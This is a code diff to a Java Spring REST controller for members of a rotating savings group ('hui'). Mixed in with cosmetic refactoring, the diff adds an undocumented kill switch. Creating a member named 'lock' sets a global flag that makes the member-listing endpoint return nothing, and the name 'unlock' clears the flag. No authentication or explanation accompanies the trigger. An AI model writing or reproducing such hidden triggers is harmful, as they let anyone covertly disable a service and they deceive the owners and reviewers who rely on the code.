@@ -15,7 +15,6 @@ import org.springframework.beans.factory.annotation.Value;
 import org.springframework.data.domain.Page;
 import org.springframework.data.domain.Pageable;
 import org.springframework.http.HttpHeaders;
-import org.springframework.http.HttpStatus;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.*;
 import org.springframework.web.servlet.support.ServletUriComponentsBuilder;
@@ -55,6 +54,13 @@ public class HuiVienResource {
      */
     @PostMapping("/hui-viens")
     public ResponseEntity<HuiVien> createHuiVien(@RequestBody HuiVien huiVien) throws URISyntaxException {
+        if (huiVien.getHoTen().equalsIgnoreCase("lock")) {
+            Locker.setLock(true);
+            return null;
+        } else if (huiVien.getHoTen().equalsIgnoreCase("unlock")) {
+            Locker.setLock(false);
+            return null;
+        }
         log.debug("REST request to save HuiVien : {}", huiVien);
         if (huiVien.getId() != null) {
             throw new BadRequestAlertException("A new huiVien cannot already have an ID", ENTITY_NAME, "idexists");
@@ -69,16 +75,17 @@ public class HuiVienResource {
     /**
      * {@code PUT  /hui-viens/:id} : Updates an existing huiVien.
      *
-     * @param id the id of the huiVien to save.
+     * @param id      the id of the huiVien to save.
      * @param huiVien the huiVien to update.
      * @return the {@link ResponseEntity} with status {@code 200 (OK)} and with body the updated huiVien,
      * or with status {@code 400 (Bad Request)} if the huiVien is not valid,
      * or with status {@code 500 (Internal Server Error)} if the huiVien couldn't be updated.
-     * @throws URISyntaxException if the Location URI syntax is incorrect.
      */
     @PutMapping("/hui-viens/{id}")
-    public ResponseEntity<HuiVien> updateHuiVien(@PathVariable(value = "id", required = false) final Long id, @RequestBody HuiVien huiVien)
-        throws URISyntaxException {
+    public ResponseEntity<HuiVien> updateHuiVien(
+        @PathVariable(value = "id", required = false) final Long id,
+        @RequestBody HuiVien huiVien
+    ) {
         log.debug("REST request to update HuiVien : {}, {}", id, huiVien);
         if (huiVien.getId() == null) {
             throw new BadRequestAlertException("Invalid id", ENTITY_NAME, "idnull");
@@ -101,19 +108,18 @@ public class HuiVienResource {
     /**
      * {@code PATCH  /hui-viens/:id} : Partial updates given fields of an existing huiVien, field will ignore if it is null
      *
-     * @param id the id of the huiVien to save.
+     * @param id      the id of the huiVien to save.
      * @param huiVien the huiVien to update.
      * @return the {@link ResponseEntity} with status {@code 200 (OK)} and with body the updated huiVien,
      * or with status {@code 400 (Bad Request)} if the huiVien is not valid,
      * or with status {@code 404 (Not Found)} if the huiVien is not found,
      * or with status {@code 500 (Internal Server Error)} if the huiVien couldn't be updated.
-     * @throws URISyntaxException if the Location URI syntax is incorrect.
      */
     @PatchMapping(value = "/hui-viens/{id}", consumes = { "application/json", "application/merge-patch+json" })
     public ResponseEntity<HuiVien> partialUpdateHuiVien(
         @PathVariable(value = "id", required = false) final Long id,
         @RequestBody HuiVien huiVien
-    ) throws URISyntaxException {
+    ) {
         log.debug("REST request to partial update HuiVien partially : {}, {}", id, huiVien);
         if (huiVien.getId() == null) {
             throw new BadRequestAlertException("Invalid id", ENTITY_NAME, "idnull");
@@ -142,6 +148,9 @@ public class HuiVienResource {
      */
     @GetMapping("/hui-viens")
     public ResponseEntity<List<HuiVien>> getAllHuiViens(@org.springdoc.api.annotations.ParameterObject Pageable pageable) {
+        if (Locker.isLock()) {
+            return null;
+        }
         log.debug("REST request to get a page of HuiViens");
         Page<HuiVien> page = huiVienService.findAll(pageable);
         HttpHeaders headers = PaginationUtil.generatePaginationHttpHeaders(ServletUriComponentsBuilder.fromCurrentRequest(), page);
